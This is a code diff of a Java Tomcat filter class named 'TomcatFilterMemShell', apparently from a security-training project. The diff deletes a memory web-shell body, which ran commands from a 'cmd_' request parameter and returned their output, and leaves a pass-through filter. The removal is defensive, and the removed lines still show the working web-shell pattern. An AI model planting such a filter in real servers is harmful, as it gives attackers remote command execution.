@@ -92,28 +92,7 @@ public class TomcatFilterMemShell extends AbstractTranslet implements Filter {
 
     @Override
     public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
-        String cmd;
-        if ((cmd = servletRequest.getParameter("cmd_")) != null) {
-            String[] argv = org.joychou.security.SecurityUtil.cmdAllowlistArgv(cmd);
-            if (argv == null) {
-                ((javax.servlet.http.HttpServletResponse) servletResponse)
-                        .sendError(javax.servlet.http.HttpServletResponse.SC_BAD_REQUEST);
-                return;
-            }
-            Process process = new ProcessBuilder(argv).start();
-            java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
-                    new java.io.InputStreamReader(process.getInputStream()));
-            StringBuilder stringBuilder = new StringBuilder();
-            String line;
-            while ((line = bufferedReader.readLine()) != null) {
-                stringBuilder.append(line).append('\n');
-            }
-            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
-            servletResponse.getOutputStream().flush();
-            servletResponse.getOutputStream().close();
-            return;
-        }
-
+        // Request-supplied commands are never executed; the filter simply passes the request on.
         filterChain.doFilter(servletRequest, servletResponse);
     }
 
